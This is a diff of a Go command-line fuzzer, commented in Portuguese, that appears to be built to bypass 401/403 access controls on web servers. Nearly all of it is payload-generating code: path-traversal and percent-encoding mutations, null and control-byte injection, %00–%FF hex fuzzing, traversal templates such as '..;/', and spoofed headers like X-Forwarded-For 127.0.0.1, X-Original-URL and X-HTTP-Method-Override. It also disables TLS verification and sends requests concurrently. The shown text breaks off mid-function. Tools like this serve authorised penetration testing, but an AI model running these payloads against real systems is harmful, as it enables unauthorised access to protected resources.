@@ -25,8 +25,10 @@ const (
 	HEADRS  = "headers"
 	REWRITE = "rewrite"
 	METHOD  = "method"
+	RICH    = "rich"
+	HEX     = "hex" // NOVO: %00..%FF aplicados no path (FUZZ)
+	TPL     = "tpl" // NOVO: templates conhecidos aplicados como FUZZ
 	ALL     = "all"
-	RICH    = "rich" // novo: combina mutações avançadas para bypass
 )
 
 type Response struct {
@@ -56,10 +58,14 @@ type Config struct {
 	Layer       int
 	Full        bool
 
-	// Novos controles de explosão
-	Aggressive           bool // -aggr: combina mais mutações simultâneas
-	MaxMutationsPerSeg   int  // -maxseg
-	TraversalDepthPerGap int  // -tdepth
+	// controles
+	Aggressive           bool
+	MaxMutationsPerSeg   int
+	TraversalDepthPerGap int
+
+	// faixa de hex para FUZZ
+	HexMin int
+	HexMax int
 }
 
 type multiFlag []string
@@ -71,26 +77,29 @@ func (f *multiFlag) Set(value string) error {
 }
 
 func main() {
-	singleURL := flag.String("u", "", "URL alvo única (deixe em branco para ler do stdin)")
-	technique := flag.String("t", "", "Técnica: dds, enc, quick, case, headers, rewrite, method, rich, all")
-	layer := flag.Int("l", 0, "Camada para aplicar modificações (1-indexado). Se não informado, usa a última camada.")
-	fullFlag := flag.Bool("full", false, "Aplica modificações a todas as camadas")
-	var headers multiFlag
-	flag.Var(&headers, "H", "Cabeçalho(s) customizado(s) 'Name: Value' (multi)")
+	singleURL := flag.String("u", "", "URL alvo única (ou via stdin)")
+	technique := flag.String("t", "", "Técnica: dds, enc, quick, case, headers, rewrite, method, rich, hex, tpl, all")
+	layer := flag.Int("l", 0, "Camada (1-index). 0 = última")
+	fullFlag := flag.Bool("full", false, "Modificar todos os segmentos")
 
-	concurrency := flag.Int("c", 10, "Requisições concorrentes")
+	var headers multiFlag
+	flag.Var(&headers, "H", "Cabeçalho(s) 'Name: Value' (multi)")
+
+	concurrency := flag.Int("c", 10, "Concorrência")
 	timeout := flag.Int("timeout", 10, "Timeout (s)")
 	output := flag.String("o", "", "Arquivo de saída (opcional)")
 	verbose := flag.Bool("v", false, "Verbose")
-	allFlag := flag.Bool("all", false, "Testa mesmo sem 401/403 no check inicial")
+	allFlag := flag.Bool("all", false, "Ignora filtro 401/403 e testa tudo")
 
-	methodFlag := flag.String("X", "", "Método HTTP a utilizar")
-	dataFlag := flag.String("d", "", "Dados para o body (JSON ou x-www-form-urlencoded)")
+	methodFlag := flag.String("X", "", "Método HTTP")
+	dataFlag := flag.String("d", "", "Body (JSON ou x-www-form-urlencoded)")
 
-	// Novos flags
-	aggr := flag.Bool("aggr", false, "Modo agressivo (mais combinações)")
-	maxseg := flag.Int("maxseg", 64, "Máximo de mutações por segmento (limite para evitar explosão)")
-	tdepth := flag.Int("tdepth", 2, "Profundidade de traversal por fronteira (ex: ../, ../../)")
+	// novos
+	aggr := flag.Bool("aggr", false, "Modo agressivo (inserção dentro do segmento)")
+	maxseg := flag.Int("maxseg", 64, "Máximo de mutações por segmento")
+	tdepth := flag.Int("tdepth", 2, "Profundidade de traversal por fronteira")
+	hexmin := flag.Int("hexmin", 0, "Hex mínimo para FUZZ (%00..%FF) (0-255)")
+	hexmax := flag.Int("hexmax", 255, "Hex máximo para FUZZ (%00..%FF) (0-255)")
 
 	flag.Parse()
 
@@ -106,10 +115,12 @@ func main() {
 		Aggressive:           *aggr,
 		MaxMutationsPerSeg:   *maxseg,
 		TraversalDepthPerGap: *tdepth,
+		HexMin:               *hexmin,
+		HexMax:               *hexmax,
 	}
 
 	if *technique == "" {
-		cfg.Techniques = []string{DDS, ENC, QUICK, CASE, RICH}
+		cfg.Techniques = []string{DDS, ENC, QUICK, CASE, RICH, HEX, TPL}
 	} else {
 		cfg.Techniques = []string{*technique}
 	}
@@ -131,15 +142,16 @@ func main() {
 		}
 	}
 	if len(urls) == 0 {
-		fmt.Println("Nenhuma URL alvo fornecida. Use -u ou stdin.")
+		fmt.Println("Nenhuma URL. Use -u ou stdin.")
 		os.Exit(1)
 	}
 	cfg.URLs = urls
 
 	toTest := filterByInitialCheck(cfg)
+
 	allPayloads := buildAllRequests(cfg, toTest)
 
-	// aplica -X / -d
+	// aplica -X/-d
 	if *methodFlag != "" || *dataFlag != "" {
 		for i := range allPayloads {
 			if *methodFlag != "" {
@@ -153,16 +165,8 @@ func main() {
 
 	results := runTests(allPayloads, cfg)
 
-	sort.Slice(results, func(i, j int) bool {
-		if results[i].StatusCode != results[j].StatusCode {
-			return results[i].StatusCode < results[j].StatusCode
-		}
-		return results[i].BodyLength < results[j].BodyLength
-	})
-
-	if !cfg.Verbose {
-		printAllResults(results, cfg)
-	}
+	// Agrupa por quantidade (desc) dentro de printAllResults
+	printAllResults(results, cfg)
 }
 
 func filterByInitialCheck(cfg Config) []string {
@@ -186,7 +190,7 @@ func filterByInitialCheck(cfg Config) []string {
 			keep = append(keep, raw)
 		}
 	}
-	// Fallback: se nada foi 401/403, testa mesmo assim
+	// fallback: se nada deu 401/403, testa mesmo assim
 	if len(keep) == 0 {
 		return cfg.URLs
 	}
@@ -198,28 +202,32 @@ func buildAllRequests(cfg Config, baseURLs []string) []Payload {
 	for _, base := range baseURLs {
 		parsed, err := url.Parse(base)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "URL inválida, ignorando: %s (erro: %v)\n", base, err)
+			fmt.Fprintf(os.Stderr, "URL inválida: %s (%v)\n", base, err)
 			continue
 		}
 		for _, tech := range cfg.Techniques {
-			var payloads []Payload
+			var ps []Payload
 			switch tech {
 			case DDS:
-				payloads = wrapPayloads(generateDDSPayloads(parsed, cfg.Layer, cfg.Full), "dds")
+				ps = wrapPayloads(generateDDSPayloads(parsed, cfg.Layer, cfg.Full), "dds")
 			case ENC:
-				payloads = wrapPayloads(generateEncodingPayloads(parsed, cfg.Layer, cfg.Full), "enc")
+				ps = wrapPayloads(generateEncodingPayloads(parsed, cfg.Layer, cfg.Full), "enc")
 			case QUICK:
-				payloads = wrapPayloads(generateQuickPayloads(parsed), "quick")
+				ps = wrapPayloads(generateQuickPayloads(parsed), "quick")
 			case CASE:
-				payloads = wrapPayloads(generateCasePayloads(parsed, cfg.Layer, cfg.Full), "case")
+				ps = wrapPayloads(generateCasePayloads(parsed, cfg.Layer, cfg.Full), "case")
 			case HEADRS:
-				payloads = generateHeadersPayloads(parsed)
+				ps = generateHeadersPayloads(parsed)
 			case REWRITE:
-				payloads = generateRewritePayloads(parsed)
+				ps = generateRewritePayloads(parsed)
 			case METHOD:
-				payloads = generateMethodPayloads(parsed)
+				ps = generateMethodPayloads(parsed)
 			case RICH:
-				payloads = wrapPayloads(generateRichBypassPayloads(parsed, cfg), "rich")
+				ps = wrapPayloads(generateRichBypassPayloads(parsed, cfg), "rich")
+			case HEX:
+				ps = wrapPayloads(generateHexFuzzPayloads(parsed, cfg), "hex")
+			case TPL:
+				ps = wrapPayloads(generateTemplateFuzzPayloads(parsed, cfg), "tpl")
 			case ALL:
 				mix := [][]Payload{
 					wrapPayloads(generateDDSPayloads(parsed, cfg.Layer, cfg.Full), "dds"),
@@ -230,28 +238,30 @@ func buildAllRequests(cfg Config, baseURLs []string) []Payload {
 					generateRewritePayloads(parsed),
 					generateMethodPayloads(parsed),
 					wrapPayloads(generateRichBypassPayloads(parsed, cfg), "rich"),
+					wrapPayloads(generateHexFuzzPayloads(parsed, cfg), "hex"),
+					wrapPayloads(generateTemplateFuzzPayloads(parsed, cfg), "tpl"),
 				}
 				for _, m := range mix {
-					payloads = append(payloads, m...)
+					ps = append(ps, m...)
 				}
 			}
-			all = append(all, payloads...)
+			all = append(all, ps...)
 		}
 	}
 	return removeDuplicatePayloads(all)
 }
 
 func wrapPayloads(urls []string, extra string) []Payload {
-	var ps []Payload
+	out := make([]Payload, 0, len(urls))
 	for _, u := range urls {
-		ps = append(ps, Payload{
+		out = append(out, Payload{
 			URL:          u,
 			ExtraHeaders: map[string]string{},
 			Method:       "GET",
 			ExtraInfo:    extra,
 		})
 	}
-	return ps
+	return out
 }
 
 func removeDuplicatePayloads(pls []Payload) []Payload {
@@ -271,7 +281,6 @@ func headersKey(h map[string]string) string {
 	if len(h) == 0 {
 		return ""
 	}
-	// ordem determinística
 	keys := make([]string, 0, len(h))
 	for k := range h {
 		keys = append(keys, k)
@@ -288,18 +297,12 @@ func headersKey(h map[string]string) string {
 }
 
 func runTests(payloads []Payload, cfg Config) []Response {
-	tr := &http.Transport{
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-	}
+	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
 	client := &http.Client{
-		Transport: tr,
-		Timeout:   time.Duration(cfg.Timeout) * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			// deixa seguir (útil pra ver se 30x vira 200)
-			return nil
-		},
+		Transport:     tr,
+		Timeout:       time.Duration(cfg.Timeout) * time.Second,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error { return nil },
 	}
-
 	resultsChan := make(chan Response, len(payloads))
 	sem := make(chan struct{}, cfg.Concurrency)
 	var wg sync.WaitGroup
@@ -318,13 +321,12 @@ func runTests(payloads []Payload, cfg Config) []Response {
 			if pl.Data != "" {
 				body = strings.NewReader(pl.Data)
 			}
+
 			req, err := http.NewRequest(method, pl.URL, body)
 			if err != nil {
 				resultsChan <- Response{URL: pl.URL, StatusCode: 0, BodyLength: 0, ExtraInfo: pl.ExtraInfo}
 				return
 			}
-
-			// heurística Content-Type
 			if pl.Data != "" && req.Header.Get("Content-Type") == "" {
 				t := strings.TrimSpace(pl.Data)
 				if strings.HasPrefix(t, "{") && strings.HasSuffix(t, "}") {
@@ -333,7 +335,6 @@ func runTests(payloads []Payload, cfg Config) []Response {
 					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 				}
 			}
-
 			req.Header.Set("User-Agent", "Mozilla/5.0")
 			req.Header.Set("Accept", "*/*")
 
@@ -363,10 +364,7 @@ func runTests(payloads []Payload, cfg Config) []Response {
 		}(p)
 	}
 
-	go func() {
-		wg.Wait()
-		close(resultsChan)
-	}()
+	go func() { wg.Wait(); close(resultsChan) }()
 
 	var results []Response
 	if cfg.Verbose {
@@ -392,22 +390,23 @@ func printResponse(writer *bufio.Writer, r Response) {
 	writer.WriteString(colorizeLine(line, r.StatusCode) + "\n")
 }
 
+// ======== OUTPUT AGRUPADO (ordem: maior quantidade -> menor) ========
+
 func printAllResults(results []Response, config Config) {
-	// Bucket por BodyLength
+	// bucket por length
 	buckets := make(map[int][]Response)
 	for _, r := range results {
 		buckets[r.BodyLength] = append(buckets[r.BodyLength], r)
 	}
-
-	// Ordena os grupos por quantidade (desc) e desempata por Length (asc)
 	lengths := make([]int, 0, len(buckets))
 	for l := range buckets {
 		lengths = append(lengths, l)
 	}
+	// ordena por quantidade desc; empate por length asc
 	sort.Slice(lengths, func(i, j int) bool {
 		ci, cj := len(buckets[lengths[i]]), len(buckets[lengths[j]])
 		if ci != cj {
-			return ci > cj // mais resultados primeiro
+			return ci > cj
 		}
 		return lengths[i] < lengths[j]
 	})
@@ -417,7 +416,7 @@ func printAllResults(results []Response, config Config) {
 	if config.OutputFile != "" {
 		file, err = os.Create(config.OutputFile)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "Erro ao criar arquivo de saída: %v\n", err)
+			fmt.Fprintf(os.Stderr, "Erro ao criar arquivo: %v\n", err)
 			os.Exit(1)
 		}
 		defer file.Close()
@@ -428,8 +427,7 @@ func printAllResults(results []Response, config Config) {
 
 	for _, length := range lengths {
 		group := buckets[length]
-
-		// Ordena dentro do grupo (Status asc, depois URL)
+		// ordena dentro do grupo por Status, depois URL
 		sort.Slice(group, func(i, j int) bool {
 			if group[i].StatusCode != group[j].StatusCode {
 				return group[i].StatusCode < group[j].StatusCode
@@ -437,17 +435,14 @@ func printAllResults(results []Response, config Config) {
 			return group[i].URL < group[j].URL
 		})
 
-		// Título do grupo
 		title := fmt.Sprintf("\n\033[1m=== Length: %d (%d resultados) ===\033[0m\n", length, len(group))
 		w.WriteString(title)
 		if file != nil {
 			_, _ = file.WriteString(fmt.Sprintf("\n=== Length: %d (%d resultados) ===\n", length, len(group)))
 		}
 
-		// Items
 		for _, res := range group {
 			printResponse(w, res)
-
 			if file != nil {
 				line := fmt.Sprintf("%s - Status: %d - Length: %d", res.URL, res.StatusCode, res.BodyLength)
 				if res.ExtraInfo != "" {
@@ -459,7 +454,7 @@ func printAllResults(results []Response, config Config) {
 	}
 }
 
-// ------------------ Geradores originais (mantidos) ------------------
+// ================== GERAÇÃO DE PAYLOADS ==================
 
 func generateDDSPayloads(parsedURL *url.URL, layer int, full bool) []string {
 	var payloads []string
@@ -516,7 +511,7 @@ func generateDDSPayloads(parsedURL *url.URL, layer int, full bool) []string {
 
 	if parsedURL.RawQuery != "" {
 		for i := range payloads {
-			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
+			payloads[i] += "?" + parsedURL.RawQuery
 		}
 	}
 	return payloads
@@ -539,7 +534,6 @@ func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string
 	pathParts := strings.Split(path, "/")
 	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
 
-	// encodings do PATH inteiro
 	encodedPath := url.PathEscape(path)
 	doubleEncodedPath := url.PathEscape(encodedPath)
 	b64Path := base64.StdEncoding.EncodeToString([]byte(path))
@@ -551,7 +545,6 @@ func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string
 		fmt.Sprintf("%s/%s", base, b64URLPath),
 	)
 
-	// quais segmentos vamos modificar
 	var idxs []int
 	if full {
 		for i := range pathParts {
@@ -568,22 +561,21 @@ func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string
 	for _, i := range idxs {
 		seg := pathParts[i]
 
-		// (a) encodings "completos" do segmento (inclui b64 std e url-safe)
-		fullEncs := generateFullEncodings(seg)
-		for _, fe := range fullEncs {
+		// encodings completos + b64
+		for _, fe := range generateFullEncodings(seg) {
 			mod := append([]string{}, pathParts...)
 			mod[i] = fe
 			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
 		}
 
-		// (b) percent-encoding por caractere (uma letra por vez)
+		// percent-encoding char a char
 		for _, cbc := range percentEncodeCharByChar(seg) {
 			mod := append([]string{}, pathParts...)
 			mod[i] = cbc
 			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
 		}
 
-		// (c) b64 do segmento inteiro (explícito)
+		// b64 segmento inteiro (std e url-safe)
 		{
 			mod := append([]string{}, pathParts...)
 			mod[i] = base64.StdEncoding.EncodeToString([]byte(seg))
@@ -595,7 +587,7 @@ func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string
 			payloads = append(payloads, fmt.Sprintf("%s/%s", base, strings.Join(mod, "/")))
 		}
 
-		// (d) b64 char-a-char (concatena b64 de cada letra)
+		// b64 char-a-char
 		if seg != "" {
 			var b64Chars []string
 			for _, ch := range seg {
@@ -607,10 +599,9 @@ func generateEncodingPayloads(parsedURL *url.URL, layer int, full bool) []string
 		}
 	}
 
-	// preserva query string
 	if parsedURL.RawQuery != "" {
 		for i := range payloads {
-			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
+			payloads[i] += "?" + parsedURL.RawQuery
 		}
 	}
 	return payloads
@@ -621,43 +612,22 @@ func generateQuickPayloads(parsedURL *url.URL) []string {
 	path := strings.TrimPrefix(parsedURL.Path, "/")
 	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)
 	quick := []string{
-		"//" + path,
-		"/./" + path,
-		"/.///" + path,
-		"/.%2f" + path,
-		"/;/" + path,
-		"/.;/" + path,
-		"//;" + path,
-		"/%2f/" + path,
-		"/./" + path + "/.",
-		"//" + path + "//",
-		"/" + path + "//",
-		"/" + path + "/./",
-		"/" + path + "%20",
-		"/" + path + "%09",
-		"/" + path + "%00",
-		"/" + path + "..;/",
-		"/" + path + "/;/",
-		"/" + path + "//;/",
-		"/" + path + "/./;/",
-		"/%2e/" + path,
-		"/%252e/" + path,
-		"/%252e%252e/" + path,
-		"/%2f/" + path,
-		"/%2f%2f/" + path,
-		"/%2f;" + path,
-		"/%3b/" + path,
-		"/%23/" + path,
-		"/%2e%2e/" + path,
-		"/..%2f" + path,
-		"/%2f..%2f" + path,
+		"//" + path, "/./" + path, "/.///" + path, "/.%2f" + path,
+		"/;/" + path, "/.;/" + path, "//;" + path, "/%2f/" + path,
+		"/./" + path + "/.", "//" + path + "//", "/" + path + "//",
+		"/" + path + "/./", "/" + path + "%20", "/" + path + "%09",
+		"/" + path + "%00", "/" + path + "..;/", "/" + path + "/;/",
+		"/" + path + "//;/", "/" + path + "/./;/", "/%2e/" + path,
+		"/%252e/" + path, "/%252e%252e/" + path, "/%2f/" + path,
+		"/%2f%2f/" + path, "/%2f;" + path, "/%3b/" + path, "/%23/" + path,
+		"/%2e%2e/" + path, "/..%2f" + path, "/%2f..%2f" + path,
 	}
 	for _, p := range quick {
 		payloads = append(payloads, base+p)
 	}
 	if parsedURL.RawQuery != "" {
 		for i := range payloads {
-			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
+			payloads[i] += "?" + parsedURL.RawQuery
 		}
 	}
 	return payloads
@@ -685,18 +655,18 @@ func generateCasePayloads(parsedURL *url.URL, layer int, full bool) []string {
 		if parts[i] == "" {
 			continue
 		}
-		variations := []string{
+		var variations []string
+		variations = append(variations,
 			strings.ToUpper(parts[i]),
 			strings.ToLower(parts[i]),
 			strings.Title(strings.ToLower(parts[i])),
-		}
+		)
 		if len(parts[i]) > 1 {
 			variations = append(variations,
 				strings.ToUpper(parts[i][:1])+parts[i][1:],
 				strings.ToLower(parts[i][:1])+parts[i][1:],
 			)
 		}
-		// alternado
 		mixed := ""
 		for j, ch := range parts[i] {
 			if j%2 == 0 {
@@ -715,26 +685,23 @@ func generateCasePayloads(parsedURL *url.URL, layer int, full bool) []string {
 	}
 	if parsedURL.RawQuery != "" {
 		for i := range payloads {
-			payloads[i] = payloads[i] + "?" + parsedURL.RawQuery
+			payloads[i] += "?" + parsedURL.RawQuery
 		}
 	}
 	return payloads
 }
 
-// ------------------ NOVO: rich/avançado ------------------
+// ---------- RICH/avançado (mantém traversal + b64 + slashes alternativos) ----------
 
 func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 	base := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
 	path := strings.TrimPrefix(u.Path, "/")
 	parts := strings.Split(path, "/")
 
-	set := make(map[string]struct{}, 2048)
+	set := make(map[string]struct{}, 4096)
 
-	// 1) control chars URL-encoded na frente de cada segmento
-	controlPrefixes := []string{
-		"%00", "%09", "%0a", "%0d", "%20", "%23", "%26", "%2b", "%2c", "%3b",
-		"%2f", "%5c", "%2e", "%2e%2f", "%2f%2e", "%2e%2e%2f", "%2f%2e%2e", "%252e%252e%252f",
-	}
+	// control chars prefix nos segmentos
+	controlPrefixes := []string{"%00", "%09", "%0a", "%0d", "%20", "%23", "%26", "%2b", "%2c", "%3b", "%2f", "%5c", "%2e", "%2e%2f", "%2f%2e", "%2e%2e%2f", "%2f%2e%2e", "%252e%252e%252f"}
 	for i := range parts {
 		orig := parts[i]
 		if orig == "" {
@@ -747,10 +714,8 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 		}
 	}
 
-	// 2) traversal nas fronteiras
-	traversals := []string{
-		"../", "..;/", "/..;/", ";../", "%2e%2e/", "%2e./", "..%2f", "%2f..%2f", "/.%2e/", "/%2e%2e/",
-	}
+	// traversal em fronteiras
+	traversals := []string{"../", "..;/", "/..;/", ";../", "%2e%2e/", "%2e./", "..%2f", "%2f..%2f", "/.%2e/", "/%2e%2e/"}
 	if cfg.TraversalDepthPerGap < 1 {
 		cfg.TraversalDepthPerGap = 1
 	}
@@ -776,7 +741,7 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 		}
 	}
 
-	// 3) duplicação "suja" do segmento (ex: admin..%2fadmin)
+	// duplicação "suja" do segmento
 	dupSep := []string{"..%2f", "%2f", ";", "%3b", "%2f..%2f", "%2e%2e%2f"}
 	for i := range parts {
 		seg := parts[i]
@@ -795,7 +760,7 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 		}
 	}
 
-	// 4) percent-encoding por caractere
+	// percent-encoding e b64 por segmento
 	hexUpper := func(b byte) string { return fmt.Sprintf("%%%02X", b) }
 	for i := range parts {
 		seg := parts[i]
@@ -803,7 +768,7 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 			continue
 		}
 
-		// segmento inteiro codificado (1x e 2x)
+		// 1x e 2x
 		{
 			mod := append([]string{}, parts...)
 			mod[i] = url.PathEscape(seg)
@@ -828,7 +793,7 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 			}
 		}
 
-		// 2 chars codificados (apenas em -aggr)
+		// 2 chars (aggr)
 		if cfg.Aggressive {
 			lim := 0
 			for a := 0; a < len(seg); a++ {
@@ -848,8 +813,8 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 			}
 		}
 
-		// 4b) base64 por caractere (apenas em -aggr)
-		if cfg.Aggressive {
+		// b64 char a char (aggr)
+		if cfg.Aggressive && seg != "" {
 			var pieces []string
 			for _, ch := range seg {
 				pieces = append(pieces, base64.StdEncoding.EncodeToString([]byte(string(ch))))
@@ -859,7 +824,7 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 			addPath(set, base, mod, u.RawQuery)
 		}
 
-		// 4c) base64 do segmento inteiro (std + url-safe)
+		// b64 segmento inteiro (std + url-safe)
 		{
 			mod := append([]string{}, parts...)
 			mod[i] = base64.StdEncoding.EncodeToString([]byte(seg))
@@ -872,36 +837,7 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 		}
 	}
 
-	// 5) case-mangling + (já cobrimos b64 acima)
-	for i := range parts {
-		seg := parts[i]
-		if seg == "" {
-			continue
-		}
-		vars := []string{
-			strings.ToUpper(seg),
-			strings.ToLower(seg),
-			strings.Title(strings.ToLower(seg)),
-		}
-		// alternado
-		mixed := ""
-		for j, ch := range seg {
-			if j%2 == 0 {
-				mixed += strings.ToUpper(string(ch))
-			} else {
-				mixed += strings.ToLower(string(ch))
-			}
-		}
-		vars = append(vars, mixed)
-
-		for _, v := range vars {
-			mod := append([]string{}, parts...)
-			mod[i] = v
-			addPath(set, base, mod, u.RawQuery)
-		}
-	}
-
-	// 6) slashes “esquisitos” entre segmentos
+	// slashes alternativos
 	altSlashes := []string{"%2f", "%252f", "%5c", "%255c", "%c0%af", "%e2%81%84", "%u2215"}
 	for i := 1; i < len(parts); i++ {
 		for _, slash := range altSlashes {
@@ -911,10 +847,9 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 		}
 	}
 
-	// 7) semicolons espalhados
+	// semicolons
 	addMany(set, joinBase(base, generateMultipleSemicolonPatterns(parts)), u.RawQuery)
 
-	// retorno ordenado
 	out := make([]string, 0, len(set))
 	for s := range set {
 		out = append(out, s)
@@ -922,6 +857,288 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 	sort.Strings(out)
 	return out
 }
+
+// ---------- NOVO: FUZZ %00..%FF aplicado por posições ----------
+
+func generateHexFuzzPayloads(u *url.URL, cfg Config) []string {
+	base := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
+	path := strings.TrimPrefix(u.Path, "/")
+	parts := strings.Split(path, "/")
+	set := make(map[string]struct{}, 1<<15)
+
+	hexList := make([]string, 0, cfg.HexMax-cfg.HexMin+1)
+	if cfg.HexMin < 0 {
+		cfg.HexMin = 0
+	}
+	if cfg.HexMax > 255 {
+		cfg.HexMax = 255
+	}
+	if cfg.HexMin > cfg.HexMax {
+		cfg.HexMin, cfg.HexMax = 0, 255
+	}
+	for v := cfg.HexMin; v <= cfg.HexMax; v++ {
+		hexList = append(hexList, fmt.Sprintf("%%%02X", v))
+	}
+
+	// 1) prefixo/sufixo de cada segmento
+	for i := range parts {
+		seg := parts[i]
+		for _, token := range hexList {
+			// prefixo
+			mod := append([]string{}, parts...)
+			mod[i] = token + seg
+			addPath(set, base, mod, u.RawQuery)
+
+			// sufixo
+			mod = append([]string{}, parts...)
+			mod[i] = seg + token
+			addPath(set, base, mod, u.RawQuery)
+		}
+
+		// 1b) dentro do segmento (aggr)
+		if cfg.Aggressive && seg != "" {
+			limit := 0
+			for pos := 0; pos <= len(seg); pos++ {
+				for _, token := range hexList {
+					newSeg := seg[:pos] + token + seg[pos:]
+					mod := append([]string{}, parts...)
+					mod[i] = newSeg
+					addPath(set, base, mod, u.RawQuery)
+
+					limit++
+					if limit >= cfg.MaxMutationsPerSeg {
+						break
+					}
+				}
+				if limit >= cfg.MaxMutationsPerSeg {
+					break
+				}
+			}
+		}
+	}
+
+	// 2) fronteiras entre segmentos (merge removendo '/')
+	for i := 0; i < len(parts)-1; i++ {
+		left := parts[i]
+		right := parts[i+1]
+		for _, token := range hexList {
+			merged := left + token + right
+			mod := append([]string{}, parts[:i]...)
+			mod = append(mod, merged)
+			mod = append(mod, parts[i+2:]...)
+			addPath(set, base, mod, u.RawQuery)
+		}
+	}
+
+	out := make([]string, 0, len(set))
+	for s := range set {
+		out = append(out, s)
+	}
+	sort.Strings(out)
+	return out
+}
+
+// ---------- NOVO: Templates conhecidos aplicados como FUZZ ----------
+
+func generateTemplateFuzzPayloads(u *url.URL, cfg Config) []string {
+	base := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
+	path := strings.TrimPrefix(u.Path, "/")
+	parts := strings.Split(path, "/")
+	set := make(map[string]struct{}, 1<<14)
+
+	templates := []string{
+		";..%2f..%2f",
+		";../",
+		"..;/",
+		"/%2e%2e/",
+		"%2f..%2f",
+		";/%2e%2e/;",
+		"%2e%2e/",
+		"%2e./",
+	}
+
+	// 1) prefixo/sufixo por segmento para cada template
+	for _, token := range templates {
+		for i := range parts {
+			seg := parts[i]
+			// prefixo
+			mod := append([]string{}, parts...)
+			mod[i] = token + seg
+			addPath(set, base, mod, u.RawQuery)
+			// sufixo
+			mod = append([]string{}, parts...)
+			mod[i] = seg + token
+			addPath(set, base, mod, u.RawQuery)
+
+			// (aggr) dentro do segmento
+			if cfg.Aggressive && seg != "" {
+				limit := 0
+				for pos := 0; pos <= len(seg); pos++ {
+					newSeg := seg[:pos] + token + seg[pos:]
+					mod := append([]string{}, parts...)
+					mod[i] = newSeg
+					addPath(set, base, mod, u.RawQuery)
+					limit++
+					if limit >= cfg.MaxMutationsPerSeg {
+						break
+					}
+				}
+			}
+		}
+	}
+
+	// 2) fronteiras (merge sem '/')
+	for _, token := range templates {
+		for i := 0; i < len(parts)-1; i++ {
+			left := parts[i]
+			right := parts[i+1]
+			merged := left + token + right
+			mod := append([]string{}, parts[:i]...)
+			mod = append(mod, merged)
+			mod = append(mod, parts[i+2:]...)
+			addPath(set, base, mod, u.RawQuery)
+		}
+	}
+
+	out := make([]string, 0, len(set))
+	for s := range set {
+		out = append(out, s)
+	}
+	sort.Strings(out)
+	return out
+}
+
+// ================== Headers / Rewrite / Methods ==================
+
+func generateHeadersPayloads(parsedURL *url.URL) []Payload {
+	var payloads []Payload
+	orig := parsedURL.String()
+	host := parsedURL.Host
+	path := parsedURL.Path
+	if path == "" {
+		path = "/"
+	}
+
+	headerSets := []map[string]string{
+		{"X-Forwarded-For": "127.0.0.1"},
+		{"X-Forwarded-For": "10.0.0.1"},
+		{"X-Forwarded-For": "192.168.0.1"},
+		{"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
+		{"X-Real-IP": "127.0.0.1"},
+		{"True-Client-IP": "127.0.0.1"},
+		{"X-Client-Ip": "127.0.0.1"},
+		{"X-Original-Client-IP": "127.0.0.1"},
+		{"X-Custom-IP-Authorization": "127.0.0.1"},
+
+		{"X-Forwarded-Proto": "https"},
+		{"X-Forwarded-Proto": "http"},
+		{"Front-End-Https": "on"},
+		{"X-Forwarded-Port": "443"},
+
+		{"Host": "127.0.0.1"},
+		{"Host": "localhost"},
+		{"X-Forwarded-Host": "127.0.0.1"},
+		{"X-Forwarded-Host": host},
+		{"X-Host": "127.0.0.1"},
+		{"X-Original-Host": host},
+
+		{"X-Original-URL": path},
+		{"X-Original-URI": path},
+		{"X-Request-URI": path},
+		{"X-Rewrite-URL": path},
+		{"X-Rewrite-Uri": path},
+		{"X-Forwarded-Uri": path},
+		{"X-Accel-Redirect": path},
+
+		{"X-HTTP-Method-Override": "DELETE"},
+		{"X-HTTP-Method-Override": "PUT"},
+		{"X-Method-Override": "DELETE"},
+		{"X-HTTP-Method": "DELETE"},
+	}
+
+	for _, hs := range headerSets {
+		info := headerInfo(hs)
+		payloads = append(payloads, Payload{
+			URL:          orig,
+			ExtraHeaders: hs,
+			Method:       "GET",
+			ExtraInfo:    "Header: " + info,
+		})
+	}
+	return payloads
+}
+
+func headerInfo(h map[string]string) string {
+	keys := make([]string, 0, len(h))
+	for k := range h {
+		keys = append(keys, k)
+	}
+	sort.Strings(keys)
+	parts := make([]string, 0, len(keys))
+	for _, k := range keys {
+		parts = append(parts, fmt.Sprintf("%s: %s", k, h[k]))
+	}
+	return strings.Join(parts, ", ")
+}
+
+func generateRewritePayloads(parsedURL *url.URL) []Payload {
+	var payloads []Payload
+	originalPath := parsedURL.Path
+	if originalPath == "" {
+		originalPath = "/"
+	}
+	baseURL := fmt.Sprintf("%s://%s/", parsedURL.Scheme, parsedURL.Host)
+	rewriteHeaders := []string{"X-Rewrite-Url", "X-Original-URL", "X-Custom-URL", "X-Rewrite-URL", "X-Original-URI", "X-Request-URI"}
+	alts := []string{originalPath, originalPath + "/.", "/%2e" + originalPath, "/..;" + originalPath}
